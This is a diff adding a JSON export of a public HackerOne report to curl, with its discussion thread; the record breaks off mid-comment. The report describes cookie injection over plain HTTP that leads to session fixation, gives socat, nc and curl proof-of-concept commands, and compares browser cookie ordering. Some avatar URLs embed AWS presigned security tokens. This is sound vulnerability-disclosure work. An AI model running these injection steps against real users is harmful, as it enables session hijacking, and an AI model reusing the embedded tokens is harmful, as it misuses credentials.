@@ -1,0 +1,767 @@
+{
+    "id": 1560324,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTYwMzI0",
+    "url": "https://hackerone.com/reports/1560324",
+    "title": "Cookie injection from non-secure context",
+    "state": "Closed",
+    "substate": "not-applicable",
+    "severity_rating": "high",
+    "readable_substate": "N/A",
+    "created_at": "2022-05-05T17:48:16.307Z",
+    "submitted_at": "2022-05-05T17:48:16.396Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "nyymi",
+        "url": "/nyymi",
+        "profile_picture_urls": {
+            "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 35663,
+        "url": "https://hackerone.com/curl",
+        "handle": "curl",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "curl",
+            "twitter_handle": "",
+            "website": "https://curl.se",
+            "about": "cURL is an Open Source project providing a library and command-line tool for doing internet transfers"
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2022-05-13T06:44:08.351Z",
+    "bug_reporter_agreed_on_going_public_at": "2022-05-12T23:03:16.037Z",
+    "team_member_agreed_on_going_public_at": "2022-05-13T06:44:08.233Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "## Summary:\n\nCurl allows injecting cookies over insecure HTTP connection that will then be sent to the target site when connecting over HTTPS.\n\nAs documented in lib/cookie.c https://github.com/curl/curl/blob/a04f0b961333e1a19848d073d8c7db9c20b2a371/lib/cookie.c#L1039 this should not be possible:\n```\n            /*\n             * A non-secure cookie may not overlay an existing secure cookie.\n             * For an existing cookie \"a\" with path \"/login\", refuse a new\n             * cookie \"a\" with for example path \"/login/en\", while the path\n             * \"/loginhelper\" is ok.\n             */\n```\n\nThis will allow session fixation (CWE-384) attack where the attacker replaces the session of the victim with their own. If the victim performs for example upload operations the upload will be sent to the account controlled bit he attacker.\n\nThis attack requires that the application in question does or  can be coaxed to make accesses to the same host over insecure HTTP connection. The attacker needs to either perform Man in the Middle attack to these insecure connections, or be able to host a HTTP server on another port on the same host.\n\n## Steps To Reproduce:\n1. Set up a HTTPS server that will respond to requests setting the SESSIONID cookie. This simulates the victim accessing the site normally. Note that the cookie has *secure* attribute:\n ```\necho -ne \"HTTP/1.1 200 OK\\r\\nSet-Cookie: SESSIONID=victimstoken; secure\\r\\nContent-Length: 0\\r\\n\\r\\n\" | socat STDIN OPENSSL-LISTEN:9999,commonname=somesite.tld,reuseaddr,verify=0,key=privkey.pem,cert=fullchain.pem\n ```\n\n2. Access the site with curl to simulate a victim login:\n ```\n curl -c cookies.txt -b cookies.txt https://somesite.tld:9999/\n ```\n\n3. Simulate the attacker either performing a MitM attack or being able to host HTTP on another port on the same host:\n\n ```\n echo -ne \"HTTP/1.1 200 OK\\r\\nSet-Cookie: SESSIONID=hackerstoken; domain=somesite.tld\\r\\nContent-Length: 0\\r\\n\\r\\n\" | nc -v -l -p 3333\n ```\n\n4. Simulate the victim visiting the attacker controlled content:\n\n ```\n curl -c cookies.txt -b cookies.txt http://somesite.tld:3333/\n ```\n\n5. Start HTTPS server that will dump the Cookie headers sent by libcurl:\n ```\n socat OPENSSL-LISTEN:9999,commonname=somesite.tld,reuseaddr,verify=0,key=privkey.pem,cert=fullchain.pem STDOUT\n ```\n\n6. Simulate the victim accessing the target site again:\n  ```\n curl -c cookies.txt -b cookies.txt https://somesite.tld:9999/\n ```\n\nThe following cookies are now sent by curl:\n`Cookie: SESSIONID=victimstoken; SESSIONID=hackerstoken`\n\nThe order the cookies appears to depend on the order of the lines in cookie store. Depending on how the victim site interpreted the multiple SESSIONID cookies the attacker may want to try to inject the cookie before login by the victim, or after the login.\n\nAfter successful attack the cookie.txt looks like this:\n```\n# Netscape HTTP Cookie File\n# https://curl.se/docs/http-cookies.html\n# This file was generated by libcurl! Edit at your own risk.\n\n.somesite.tld    TRUE    /       FALSE   0       SESSIONID       hackerstoken\nsomesite.tld     FALSE   /       TRUE    0       SESSIONID       victimstoken\n```\n\nThis is CWE-384: Session Fixation.\n\n## Impact\n\nCookie injection leading to CWE-384: Session Fixation and/or other similar attacks.",
+    "weakness": {
+        "id": 47,
+        "name": "Session Fixation"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [],
+    "allow_singular_disclosure_at": null,
+    "vote_count": 2,
+    "voters": [
+        "zy9ard3",
+        "shivammusic"
+    ],
+    "severity": {
+        "rating": "high",
+        "author_type": "User"
+    },
+    "structured_scope": {
+        "databaseId": 18844,
+        "asset_type": "SOURCE_CODE",
+        "asset_identifier": "https://github.com/curl/curl",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 16579802,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "CWE-384 is likely a bit misleading CWE for this. It's actually just one of the impacts of this issue. Some logic flaw or injection CWE might be more correct in describing this issue perhaps.",
+            "automated_response": false,
+            "created_at": "2022-05-05T17:52:51.808Z",
+            "updated_at": "2022-05-05T17:52:51.808Z",
+            "actor": {
+                "username": "nyymi",
+                "cleared": false,
+                "verified": false,
+                "url": "/nyymi",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16579898,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Thank you for your report!\n\nWe will take some time and investigate your reports and get back to you with details and possible follow-up questions as soon as we can!",
+            "automated_response": false,
+            "created_at": "2022-05-05T17:58:45.772Z",
+            "updated_at": "2022-05-05T17:58:45.772Z",
+            "actor": {
+                "username": "bagder",
+                "cleared": false,
+                "verified": false,
+                "url": "/bagder",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5PJWT3OC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070209Z&X-Amz-Expires=621&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDbXZrgxxh8yDYQLaIX8q13Y63Lo%2FN579Tziw%2Bf483g7AiBQo0t02RBmcjZaKYOdhky6k95lmebSLQb4aW10oKgs9Cq7BQia%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMEmm8lf%2FNmZYMTkkOKo8Felzq5ucherjY1gjQ4Od8%2FLfnQkxpEGyNVf1QeXuZMAkcJJYqwLSwIJTmJrmer4tNSkXgL3ZAiO3ZJ54RxttpKm7i0oglQ6wPU%2FVzmSLW%2Fq59O1PWHR5Xm7KeOjJho28q3UCVD%2Byu4gJgmTn35wvsInBgS%2FKSUrFdNwMF%2FhJ%2B2N7fieZuTX32gZf9Egnmg9jzGRMUN9yS5gyNc1G%2Fp8UTsLZEXc9AfOXxT4nI95c5hCrK5gr8bkqK1T3E9A84SAL2WuLD%2BdayfN%2BjvOcm9FsQoMLc%2FL5seF10DmEtras1rL8XjepI22AO7%2FB4%2BHBrjXvsrTZbojVL4%2Bt7ibqDMhfMgAZuTahnGjkXxQQX2HZw1hHbfSDxQ9mxOvu3ugWtKQt5YPYtbcsn6A96bkuxX0I4SLBC%2FQpAb7axi%2BPoKyGsJpmMEEgBKtZLaOl%2F5U7mV0YLoORuICw3VvahxgBYu2pBFBA2NhIx1BD8xWJFp8rQT2e1x3O2X2hO7Iwv97sqeveAOJutSXQ28ep8rchOr9k3lmEDlizITm%2FKSkA3Tk3UUWHx9Wye2KV%2B8nPeF4Mnzd4VtqzxQU9XezNFErk%2FGvYOQspY5zgQ3A7%2BdO7kOjTdP88LQbuuIR1KWlusrB4gf0IifUknGS1OQ6nyaFPKjPZWl5SoAhsdB45n%2FtOP2Pk%2F%2Bf23eZ8ekcPR6KomBQHDCR4OY%2Bus9GX08xh8cCPdqDmlNgajbWKmIGrtWk1Kz9LnqjQA5Rfzs56EOYx%2BObU0Xh6aIzxlJY2WePQsRb5FpKl2VMKR9%2BDVFFr0sVdYfVW3NU5wreujTa2ofUWw7ITrLjjbYvRIwFiAbB5OInx93UnLpEWA4wv1qZB649IJ%2BFFFADD2hrWnBjqyAR2PdV6SL51EidXYWyT0f0pKLukb9DVp%2B%2FuG%2FFhQlWrL5C%2Fh7mJtECL4hGQZQA35s7YnJcQSpzKEB8jSodqQ20ETjQmbMoHUdAQ0dVsHVo4gwXVTz43T3pENGKyhX2fX%2FQveR9P7xXXGPZCiDWEK199jEzdCIvba7ZkPuhpgzxCprsHPxszgHgo2Xzw8V7rytA0mV%2BhhcwrBJHo2drrcgmwq5GNSS6%2Fuw9DbFtvAvm6JL4E%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ead19f2c99099635129c4b14cb1f945a7011f309f0d2c4362d41ed8fd52e2d82"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16579915,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "If I'd have to guess the issue is that the protection against \"overriding existing secure cookies\" only considers non-domain cookies. This is from the fact that dropping the `domain=somesite.tld` makes the protection work as expected.",
+            "automated_response": false,
+            "created_at": "2022-05-05T18:03:22.448Z",
+            "updated_at": "2022-05-05T18:03:22.448Z",
+            "actor": {
+                "username": "nyymi",
+                "cleared": false,
+                "verified": false,
+                "url": "/nyymi",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16579970,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "FWIW, the relevant portion of the RFC draft seems to be https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis/#section-5.5 item 16.",
+            "automated_response": false,
+            "created_at": "2022-05-05T18:09:43.498Z",
+            "updated_at": "2022-05-05T18:09:43.498Z",
+            "actor": {
+                "username": "dgustafsson",
+                "cleared": false,
+                "verified": false,
+                "url": "/dgustafsson",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16581210,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "s/controlled bit he attacker/controlled by the attacker/g",
+            "automated_response": false,
+            "created_at": "2022-05-05T19:18:16.682Z",
+            "updated_at": "2022-05-05T19:18:16.682Z",
+            "actor": {
+                "username": "nyymi",
+                "cleared": false,
+                "verified": false,
+                "url": "/nyymi",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16582306,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "It's hard to figure out exactly if this is working as intended or if the spec says that this is actually the same cookie. I'll need to read this again.",
+            "automated_response": false,
+            "created_at": "2022-05-05T21:31:25.096Z",
+            "updated_at": "2022-05-05T21:31:25.096Z",
+            "actor": {
+                "username": "bagder",
+                "cleared": false,
+                "verified": false,
+                "url": "/bagder",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5PJWT3OC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070209Z&X-Amz-Expires=621&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDbXZrgxxh8yDYQLaIX8q13Y63Lo%2FN579Tziw%2Bf483g7AiBQo0t02RBmcjZaKYOdhky6k95lmebSLQb4aW10oKgs9Cq7BQia%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMEmm8lf%2FNmZYMTkkOKo8Felzq5ucherjY1gjQ4Od8%2FLfnQkxpEGyNVf1QeXuZMAkcJJYqwLSwIJTmJrmer4tNSkXgL3ZAiO3ZJ54RxttpKm7i0oglQ6wPU%2FVzmSLW%2Fq59O1PWHR5Xm7KeOjJho28q3UCVD%2Byu4gJgmTn35wvsInBgS%2FKSUrFdNwMF%2FhJ%2B2N7fieZuTX32gZf9Egnmg9jzGRMUN9yS5gyNc1G%2Fp8UTsLZEXc9AfOXxT4nI95c5hCrK5gr8bkqK1T3E9A84SAL2WuLD%2BdayfN%2BjvOcm9FsQoMLc%2FL5seF10DmEtras1rL8XjepI22AO7%2FB4%2BHBrjXvsrTZbojVL4%2Bt7ibqDMhfMgAZuTahnGjkXxQQX2HZw1hHbfSDxQ9mxOvu3ugWtKQt5YPYtbcsn6A96bkuxX0I4SLBC%2FQpAb7axi%2BPoKyGsJpmMEEgBKtZLaOl%2F5U7mV0YLoORuICw3VvahxgBYu2pBFBA2NhIx1BD8xWJFp8rQT2e1x3O2X2hO7Iwv97sqeveAOJutSXQ28ep8rchOr9k3lmEDlizITm%2FKSkA3Tk3UUWHx9Wye2KV%2B8nPeF4Mnzd4VtqzxQU9XezNFErk%2FGvYOQspY5zgQ3A7%2BdO7kOjTdP88LQbuuIR1KWlusrB4gf0IifUknGS1OQ6nyaFPKjPZWl5SoAhsdB45n%2FtOP2Pk%2F%2Bf23eZ8ekcPR6KomBQHDCR4OY%2Bus9GX08xh8cCPdqDmlNgajbWKmIGrtWk1Kz9LnqjQA5Rfzs56EOYx%2BObU0Xh6aIzxlJY2WePQsRb5FpKl2VMKR9%2BDVFFr0sVdYfVW3NU5wreujTa2ofUWw7ITrLjjbYvRIwFiAbB5OInx93UnLpEWA4wv1qZB649IJ%2BFFFADD2hrWnBjqyAR2PdV6SL51EidXYWyT0f0pKLukb9DVp%2B%2FuG%2FFhQlWrL5C%2Fh7mJtECL4hGQZQA35s7YnJcQSpzKEB8jSodqQ20ETjQmbMoHUdAQ0dVsHVo4gwXVTz43T3pENGKyhX2fX%2FQveR9P7xXXGPZCiDWEK199jEzdCIvba7ZkPuhpgzxCprsHPxszgHgo2Xzw8V7rytA0mV%2BhhcwrBJHo2drrcgmwq5GNSS6%2Fuw9DbFtvAvm6JL4E%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ead19f2c99099635129c4b14cb1f945a7011f309f0d2c4362d41ed8fd52e2d82"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16582432,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Either I've totally misunderstood something here or I've actually stumbled on some rather serious generic vulnerability. It seems to get reproduced with Firefox 100 and Chrome 101:\n\n```\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:100.0) Gecko/20100101 Firefox/100.0\n...\nCookie: SESSIONID=hackerstoken; SESSIONID=victimstoken\n```\n\nChrome 101:\n```\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36\n...\nCookie: SESSIONID=hackerstoken; SESSIONID=victimstoken\n```\n\nThis is really really bad.",
+            "automated_response": false,
+            "created_at": "2022-05-05T21:51:52.269Z",
+            "updated_at": "2022-05-05T21:51:52.269Z",
+            "actor": {
+                "username": "nyymi",
+                "cleared": false,
+                "verified": false,
+                "url": "/nyymi",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16582478,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Exploiting this requires somewhat active attack, but I still have very hard time believing this is how cookies should work. Please do let me know if there is something I've missed here and this somehow works as intended... I'm really puzzled ATM.",
+            "automated_response": false,
+            "created_at": "2022-05-05T22:02:53.281Z",
+            "updated_at": "2022-05-05T22:02:53.281Z",
+            "actor": {
+                "username": "nyymi",
+                "cleared": false,
+                "verified": false,
+                "url": "/nyymi",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16582575,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I think the cookie order might be the key here. The last cookie set should be used I think. I haven't yet been able to make browsers send `hackerstoken` last. Maybe if the path is identical they're sorted by \"security\" (least secure first, most secure last) or \"domain\" (least specific first, most specific last)",
+            "automated_response": false,
+            "created_at": "2022-05-05T22:12:07.673Z",
+            "updated_at": "2022-05-05T22:14:49.713Z",
+            "actor": {
+                "username": "nyymi",
+                "cleared": false,
+                "verified": false,
+                "url": "/nyymi",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16582641,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Ok, some more testing done:\n- Both Chrome and Firefox reject `Set-Cookie` from HTTP that would override \"secure\" cookie with same name. But if no secure cookie is present the non-secure cookie can be added. Later if secure cookie is added you can end up with two cookies as above. So `HTTP` first, then `HTTPS` you will have this scenario.\n- If both cookies are present they always seem to be sent in `Cookie: SESSIONID=hackerstoken; SESSIONID=victimstoken` order (prioritising the \"more secure\" cookie).\n\nSo browsers seem to be fine. I'll try to verify this by looking at chromium source code a bit.\n\nlibcurl not behaving like this would also seem to confirm that this is a genuine security flaw in curl.",
+            "automated_response": false,
+            "created_at": "2022-05-05T22:25:23.324Z",
+            "updated_at": "2022-05-05T22:28:19.742Z",
+            "actor": {
+                "username": "nyymi",
+                "cleared": false,
+                "verified": false,
+                "url": "/nyymi",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16582658,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "[4.2.2 semantics](https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis/#section-4.2.2):\n\n   Although cookies are serialized linearly in the Cookie header field,\n   servers SHOULD NOT rely upon the serialization order.  In particular,\n   if the Cookie header field contains two cookies with the same name\n   (e.g., that were set with different Path or Domain attributes),\n   servers SHOULD NOT rely upon the order in which these cookies appear\n   in the header field.\n",
+            "automated_response": false,
+            "created_at": "2022-05-05T22:32:16.679Z",
+            "updated_at": "2022-05-05T22:32:16.679Z",
+            "actor": {
+                "username": "bagder",
+                "cleared": false,
+                "verified": false,
+                "url": "/bagder",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5PJWT3OC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070209Z&X-Amz-Expires=621&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDbXZrgxxh8yDYQLaIX8q13Y63Lo%2FN579Tziw%2Bf483g7AiBQo0t02RBmcjZaKYOdhky6k95lmebSLQb4aW10oKgs9Cq7BQia%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMEmm8lf%2FNmZYMTkkOKo8Felzq5ucherjY1gjQ4Od8%2FLfnQkxpEGyNVf1QeXuZMAkcJJYqwLSwIJTmJrmer4tNSkXgL3ZAiO3ZJ54RxttpKm7i0oglQ6wPU%2FVzmSLW%2Fq59O1PWHR5Xm7KeOjJho28q3UCVD%2Byu4gJgmTn35wvsInBgS%2FKSUrFdNwMF%2FhJ%2B2N7fieZuTX32gZf9Egnmg9jzGRMUN9yS5gyNc1G%2Fp8UTsLZEXc9AfOXxT4nI95c5hCrK5gr8bkqK1T3E9A84SAL2WuLD%2BdayfN%2BjvOcm9FsQoMLc%2FL5seF10DmEtras1rL8XjepI22AO7%2FB4%2BHBrjXvsrTZbojVL4%2Bt7ibqDMhfMgAZuTahnGjkXxQQX2HZw1hHbfSDxQ9mxOvu3ugWtKQt5YPYtbcsn6A96bkuxX0I4SLBC%2FQpAb7axi%2BPoKyGsJpmMEEgBKtZLaOl%2F5U7mV0YLoORuICw3VvahxgBYu2pBFBA2NhIx1BD8xWJFp8rQT2e1x3O2X2hO7Iwv97sqeveAOJutSXQ28ep8rchOr9k3lmEDlizITm%2FKSkA3Tk3UUWHx9Wye2KV%2B8nPeF4Mnzd4VtqzxQU9XezNFErk%2FGvYOQspY5zgQ3A7%2BdO7kOjTdP88LQbuuIR1KWlusrB4gf0IifUknGS1OQ6nyaFPKjPZWl5SoAhsdB45n%2FtOP2Pk%2F%2Bf23eZ8ekcPR6KomBQHDCR4OY%2Bus9GX08xh8cCPdqDmlNgajbWKmIGrtWk1Kz9LnqjQA5Rfzs56EOYx%2BObU0Xh6aIzxlJY2WePQsRb5FpKl2VMKR9%2BDVFFr0sVdYfVW3NU5wreujTa2ofUWw7ITrLjjbYvRIwFiAbB5OInx93UnLpEWA4wv1qZB649IJ%2BFFFADD2hrWnBjqyAR2PdV6SL51EidXYWyT0f0pKLukb9DVp%2B%2FuG%2FFhQlWrL5C%2Fh7mJtECL4hGQZQA35s7YnJcQSpzKEB8jSodqQ20ETjQmbMoHUdAQ0dVsHVo4gwXVTz43T3pENGKyhX2fX%2FQveR9P7xXXGPZCiDWEK199jEzdCIvba7ZkPuhpgzxCprsHPxszgHgo2Xzw8V7rytA0mV%2BhhcwrBJHo2drrcgmwq5GNSS6%2Fuw9DbFtvAvm6JL4E%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ead19f2c99099635129c4b14cb1f945a7011f309f0d2c4362d41ed8fd52e2d82"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16582800,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "So depending on server behaviour browsers could be also affected if the attacker manages to inject the fixed session before the victim visit the target site via `HTTPS`.\n\nTrying to find something as specific has cookie handling in chromium is painful. I think I'll maybe look into this closer later. EDIT: Might be this https://github.com/chromium/chromium/blob/main/net/cookies",
+            "automated_response": false,
+            "created_at": "2022-05-05T23:07:38.365Z",
+            "updated_at": "2022-05-05T23:12:21.883Z",
+            "actor": {
+                "username": "nyymi",
+                "cleared": false,
+                "verified": false,
+                "url": "/nyymi",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16582893,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I think the safe way would be to reject set-cookie in this situation like the browsers do.\nBut it's currently a bit unclear to me how the browsers decide the cookie order in the response.\n\nIt clearly isn't just alpha sorted at least:\n\n```\nCookie: SESSIONID=xhackerstoken; SESSIONID=yvictimstoken\n```\n```\nCookie: SESSIONID=yhackerstoken; SESSIONID=xvictimstoken\n```\nBoth Firefox and Chrome behave like this.",
+            "automated_response": false,
+            "created_at": "2022-05-05T23:41:46.306Z",
+            "updated_at": "2022-05-05T23:41:46.306Z",
+            "actor": {
+                "username": "nyymi",
+                "cleared": false,
+                "verified": false,
+                "url": "/nyymi",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16582932,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I figured it out, I think.\n\nWith Firefox the cookies are sorted by creation time:\n`Cookie: SESSIONID=yhackerstoken; SESSIONID=xvictimstoken; FIRST=1; SECOND=1; THIRD=1; LAST=1`\n\nModifying the cookie doesn't change the order for Firefox, they're still in the creation order:\n`Cookie: SESSIONID=yhackerstoken; SESSIONID=xvictimstoken; FIRST=1; SECOND=2; THIRD=1; LAST=1`\n`Cookie: SESSIONID=yhackerstoken; SESSIONID=somethingelse; FIRST=1; SECOND=2; THIRD=1; LAST=1`\n\nWith Chrome the order of the cookies is the modification time. After same changes to cookies we get:\n`Cookie: SESSIONID=yhackerstoken; FIRST=1; THIRD=1; LAST=1; SECOND=2; SESSIONID=somethingelse`\n\nEither way, if server pick up the first cookie value the both Firefox and Chrome are susceptible to early section fixation via HTTP.",
+            "automated_response": false,
+            "created_at": "2022-05-05T23:56:14.508Z",
+            "updated_at": "2022-05-05T23:59:01.697Z",
+            "actor": {
+                "username": "nyymi",
+                "cleared": false,
+                "verified": false,
+                "url": "/nyymi",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16583936,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "There's a lot of testing to do outside of libcurl's scope, but I guess I'll take that somewhere else now, and not spam this space.\n\nNeedless to say this seems to be far far worse than I initially though. I will need to sort the actual impact out a bit more, as there are a lot of moving parts.\n\nIt could be that since this issue is so widespread it may require some time to sort out so that the impact is minimized.",
+            "automated_response": false,
+            "created_at": "2022-05-06T01:00:18.354Z",
+            "updated_at": "2022-05-06T01:00:18.354Z",
+            "actor": {
+                "username": "nyymi",
+                "cleared": false,
+                "verified": false,
+                "url": "/nyymi",
